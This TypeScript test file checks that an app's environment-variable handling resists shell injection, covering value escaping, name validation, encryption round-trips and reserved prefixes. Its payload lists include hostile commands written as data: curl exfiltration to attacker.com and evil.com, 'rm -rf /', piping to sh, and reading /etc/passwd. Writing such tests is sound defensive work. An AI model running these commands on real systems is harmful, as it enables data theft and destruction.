/**
 * Adversarial Shell Escaping Tests (L4)
 *
 * Security assessment: Phase 6 — Input Validation & Injection
 * Tests the env var handling chain for shell injection resistance:
 * 1. Env var NAME validation (validateUserEnvVarName, Zod envVarNameSchema)
 * 2. Env var VALUE handling through encrypt/decrypt round-trip
 * 3. Shell escaping of decrypted values (single-quote escape from start-openclaw.sh)
 * 4. Reserved env var prefix protection
 *
 * The critical code path: user-controlled env var values are decrypted at boot
 * and written as `export NAME='escaped-value'` lines sourced by bash.
 * The escaping must prevent shell injection for ALL possible values.
 *
 * See: findings-and-reviews/shell-escaping-adversarial-testing.md
 */

import { describe, it, expect } from 'vitest';
import {
  generateEnvKey,
  encryptEnvValue,
  decryptEnvValue,
  isEncryptedEnvValue,
  isValidShellIdentifier,
  validateUserEnvVarName,
} from './env-encryption';
import { InstanceConfigSchema } from '../schemas/instance-config';

// =============================================================================
// Shell escape function — extracted from start-openclaw.sh line 80
// =============================================================================

function shellEscapeSingleQuote(value: string): string {
  return value.replace(/'/g, "'\\''");
}

function buildExportLine(name: string, value: string): string {
  const escaped = shellEscapeSingleQuote(value);
  return `export ${name}='${escaped}'`;
}

// =============================================================================
// Adversarial env var VALUES — shell injection attempts
// =============================================================================

const SHELL_INJECTION_VALUES = [
  // Command substitution
  { label: '$(whoami)', value: '$(whoami)' },
  { label: '$(cat /etc/passwd)', value: '$(cat /etc/passwd)' },
  { label: '$(curl attacker.com)', value: '$(curl http://attacker.com/exfil)' },
  { label: 'backtick command', value: '`whoami`' },
  { label: 'backtick nested', value: '`curl http://evil.com/$(whoami)`' },

  // Single quote escape attempts
  { label: 'break single quote', value: "'; echo pwned; '" },
  { label: 'break with command sub', value: "'; $(whoami); '" },
  { label: 'nested single quotes', value: "''''" },
  { label: 'alternating quotes', value: `'"'"'` },
  { label: 'quote then semicolon', value: "';" },
  { label: 'value is just a single quote', value: "'" },
  { label: 'value is multiple single quotes', value: "'''''" },

  // Double quote context
  { label: 'double quote break', value: '"; echo pwned; "' },
  { label: 'double quote with variable', value: '"$HOME"' },
  { label: 'double quote with command sub', value: '"$(whoami)"' },

  // Variable expansion
  { label: '$HOME', value: '$HOME' },
  { label: '$PATH', value: '$PATH' },
  { label: '${HOME}', value: '${HOME}' },
  { label: '${HOME:-/tmp}', value: '${HOME:-/tmp}' },
  { label: '$((1+1)) arithmetic', value: '$((1+1))' },

  // Newlines and control characters
  { label: 'newline injection', value: "value\n'; echo injected; '" },
  { label: 'carriage return', value: 'value\r\necho injected' },
  { label: 'null byte', value: 'value\x00echo injected' },
  { label: 'tab then command', value: 'value\t$(whoami)' },
  { label: 'vertical tab', value: 'value\x0Binjected' },
  { label: 'form feed', value: 'value\x0Cinjected' },
  { label: 'bell character', value: 'value\x07injected' },
  { label: 'escape character', value: 'value\x1Binjected' },

  // Pipe and redirect
  { label: 'pipe to shell', value: 'value | sh' },
  { label: 'redirect write', value: 'value > /tmp/pwned' },
  { label: 'redirect append', value: 'value >> /tmp/pwned' },
  { label: 'redirect read', value: 'value < /etc/passwd' },
  { label: 'heredoc attempt', value: 'value << EOF\ninjected\nEOF' },

  // Semicolons and logical operators
  { label: 'semicolon command', value: 'value; rm -rf /' },
  { label: 'AND operator', value: 'value && echo pwned' },
  { label: 'OR operator', value: 'value || echo pwned' },

  // Glob and wildcards
  { label: 'glob star', value: '/*' },
  { label: 'glob question', value: '/tmp/?' },
  { label: 'glob bracket', value: '/tmp/[a-z]*' },
  { label: 'brace expansion', value: '{cat,/etc/passwd}' },

  // Path traversal in values
  { label: 'path traversal', value: '../../../etc/passwd' },

  // Unicode edge cases
  { label: 'CJK value', value: '\u5BC6\u7801\u6D4B\u8BD5' },
  { label: 'emoji value', value: '\uD83D\uDD11\uD83D\uDD12\uD83D\uDC80' },
  { label: 'RTL override', value: '\u202Eadmin\u202C' },
  { label: 'zero-width space', value: 'val\u200Bue' },
  { label: 'BOM prefix', value: '\uFEFFvalue' },

  // Long values
  { label: '10KB value', value: 'A'.repeat(10240) },
  { label: '100KB value', value: 'B'.repeat(102400) },

  // Empty and whitespace
  { label: 'empty string', value: '' },
  { label: 'only spaces', value: '    ' },
  { label: 'only newlines', value: '\n\n\n' },
  { label: 'only single quotes', value: "'''''" },

  // Real-world API key patterns
  { label: 'key with plus', value: 'sk-abc+def/ghi==' },
  { label: 'key with backslash', value: 'token\\with\\backslashes' },
  {
    label: 'JWT-like',
    value:
      'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U',
  },
];

// =============================================================================
// Adversarial env var NAMES — injection via variable names
// =============================================================================

const SHELL_INJECTION_NAMES = [
  '$(whoami)',
  '`whoami`',
  "NAME'",
  'NAME"',
  "NAME'; echo pwned",
  'NAME;EVIL',
  'NAME&&EVIL',
  'NAME||EVIL',
  'NAME|EVIL',
  'NAME>EVIL',
  'NAME<EVIL',
  'NAME WITH SPACES',
  'NAME\tTAB',
  'NAME\nNEWLINE',
  '0BADNAME',
  '123',
  '',
  'MY-VAR',
  'my-var-name',
  'MY.VAR',
  'NAME=VALUE',
  'NAME/PATH',
  'NAME\x00EVIL',
  'NAME\\EVIL',
  '$HOME',
  '${PATH}',
];

// Reserved prefix names (valid identifiers but blocked by prefix check)
const RESERVED_PREFIX_NAMES = ['KILOCLAW_ENC_SECRET', 'KILOCLAW_ENV_KEY'];

// =============================================================================
// Tests: Adversarial env var VALUES
// =============================================================================

describe('shell escaping — adversarial env var values', () => {
  it('single-quote escaping produces safe export lines for all injection payloads', () => {
    for (const { label, value } of SHELL_INJECTION_VALUES) {
      const exportLine = buildExportLine('TEST_VAR', value);
      expect(exportLine, `Format broken for: ${label}`).toMatch(/^export TEST_VAR='/);
      expect(exportLine, `Unclosed quote for: ${label}`).toMatch(/'$/);
    }
  });

  it('encrypted values with injection payloads round-trip correctly', () => {
    const key = generateEnvKey();
    for (const { label, value } of SHELL_INJECTION_VALUES) {
      const encrypted = encryptEnvValue(key, value);
      const decrypted = decryptEnvValue(key, encrypted);
      expect(decrypted, `Round-trip failed for: ${label}`).toBe(value);
    }
  });

  it('full chain: encrypt → decrypt → shell-escape produces safe export lines', () => {
    const key = generateEnvKey();
    for (const { label, value } of SHELL_INJECTION_VALUES) {
      const encrypted = encryptEnvValue(key, value);
      const decrypted = decryptEnvValue(key, encrypted);
      const exportLine = buildExportLine('TEST_VAR', decrypted);
      // Export line is well-formed after the full chain
      expect(exportLine, `Format broken for: ${label}`).toMatch(/^export TEST_VAR='/);
      expect(exportLine, `Unclosed quote for: ${label}`).toMatch(/'$/);
    }
  });

  it('single-quote values produce balanced quotes after escaping', () => {
    const quotedValues = [
      "'",
      "''",
      "'''",
      "it's a test",
      "'; DROP TABLE users; --",
      "value'$(whoami)'more",
      "a'b'c'd'e",
      "\\''\\",
    ];
    for (const value of quotedValues) {
      const escaped = shellEscapeSingleQuote(value);
      const exportLine = `export VAR='${escaped}'`;
      const withoutEscapes = exportLine.replace(/'\\''/g, '');
      const quoteCount = (withoutEscapes.match(/'/g) || []).length;
      expect(quoteCount % 2, `Unbalanced quotes for: ${JSON.stringify(value)}`).toBe(0);
    }
  });

  it('newlines in values stay inside single quotes', () => {
    const payloads = [
      'value\necho INJECTED',
      "value\n'; echo INJECTED; '",
      '\n\n\necho INJECTED',
      'value\r\necho INJECTED',
    ];
    for (const value of payloads) {
      const exportLine = buildExportLine('SAFE_VAR', value);
      expect(exportLine).toMatch(/^export SAFE_VAR='/);
      expect(exportLine).toMatch(/'$/);
    }
  });
});

// =============================================================================
// Tests: Adversarial env var NAMES
// =============================================================================

describe('shell escaping — adversarial env var names', () => {
  it('validateUserEnvVarName rejects all injection payloads', () => {
    for (const name of SHELL_INJECTION_NAMES) {
      expect(
        () => validateUserEnvVarName(name),
        `Should reject name: ${JSON.stringify(name)}`
      ).toThrow();
    }
  });

  it('isValidShellIdentifier rejects all dangerous name patterns', () => {
    for (const name of SHELL_INJECTION_NAMES) {
      expect(isValidShellIdentifier(name), `Should reject: ${JSON.stringify(name)}`).toBe(false);
    }
  });

  it('Zod envVarNameSchema rejects all injection payloads', () => {
    for (const name of [...SHELL_INJECTION_NAMES, ...RESERVED_PREFIX_NAMES]) {
      const result = InstanceConfigSchema.safeParse({ envVars: { [name]: 'test-value' } });
      expect(result.success, `Zod should reject: ${JSON.stringify(name)}`).toBe(false);
    }
  });

  it('accepts legitimate env var names', () => {
    const validNames = [
      'MY_VAR',
      '_PRIVATE',
      'A',
      '_',
      '__',
      'var123',
      'ANTHROPIC_API_KEY',
      'OPENAI_API_KEY',
      'MY_LONG_ENV_VAR_NAME_WITH_NUMBERS_123',
    ];
    for (const name of validNames) {
      expect(() => validateUserEnvVarName(name), `Should accept: ${name}`).not.toThrow();
    }
  });
});

// =============================================================================
// Tests: Reserved env var protection
// =============================================================================

describe('shell escaping — reserved env var protection', () => {
  it('rejects KILOCLAW_ENC_ prefix', () => {
    expect(() => validateUserEnvVarName('KILOCLAW_ENC_ANYTHING')).toThrow('reserved prefix');
  });

  it('rejects KILOCLAW_ENV_ prefix', () => {
    expect(() => validateUserEnvVarName('KILOCLAW_ENV_ANYTHING')).toThrow('reserved prefix');
  });

  it('allows KILOCLAW_ without ENC_ or ENV_ suffix', () => {
    expect(() => validateUserEnvVarName('KILOCLAW_FOO')).not.toThrow();
  });

  it('Zod schema rejects reserved prefixes', () => {
    const encResult = InstanceConfigSchema.safeParse({ envVars: { KILOCLAW_ENC_SECRET: 'v' } });
    expect(encResult.success).toBe(false);
    const envResult = InstanceConfigSchema.safeParse({ envVars: { KILOCLAW_ENV_KEY: 'v' } });
    expect(envResult.success).toBe(false);
  });
});

// =============================================================================
// Tests: Encryption integrity
// =============================================================================

describe('shell escaping — encryption integrity', () => {
  it('all injection payloads survive AES-256-GCM round-trip', () => {
    const key = generateEnvKey();
    for (const { label, value } of SHELL_INJECTION_VALUES) {
      const encrypted = encryptEnvValue(key, value);
      expect(isEncryptedEnvValue(encrypted), `Wrong prefix for: ${label}`).toBe(true);
      expect(decryptEnvValue(key, encrypted), `Corrupted for: ${label}`).toBe(value);
    }
  });

  it('wrong key fails to decrypt', () => {
    const key1 = generateEnvKey();
    const key2 = generateEnvKey();
    const encrypted = encryptEnvValue(key1, "'; echo pwned; '");
    expect(() => decryptEnvValue(key2, encrypted)).toThrow();
  });

  it('tampered ciphertext is rejected by GCM auth tag', () => {
    const key = generateEnvKey();
    const encrypted = encryptEnvValue(key, 'secret-value');
    const parts = encrypted.split(':');
    const data = Buffer.from(parts[2], 'base64');
    data[15] ^= 0xff;
    const tampered = `enc:v1:${data.toString('base64')}`;
    expect(() => decryptEnvValue(key, tampered)).toThrow();
  });
});

// =============================================================================
// Tests: Regex consistency between TypeScript and start-openclaw.sh
// =============================================================================

describe('shell escaping — regex consistency', () => {
  // start-openclaw.sh line 49: const VALID_NAME = /^[A-Za-z_][A-Za-z0-9_]*$/;
  const START_SCRIPT_VALID_NAME = /^[A-Za-z_][A-Za-z0-9_]*$/;

  it('start-openclaw.sh regex matches env-encryption.ts regex for all inputs', () => {
    const allNames = [...SHELL_INJECTION_NAMES, 'VALID_NAME', '_also_valid', 'x', 'X123'];
    for (const name of allNames) {
      expect(isValidShellIdentifier(name), `Regex mismatch for: ${JSON.stringify(name)}`).toBe(
        START_SCRIPT_VALID_NAME.test(name)
      );
    }
  });
});
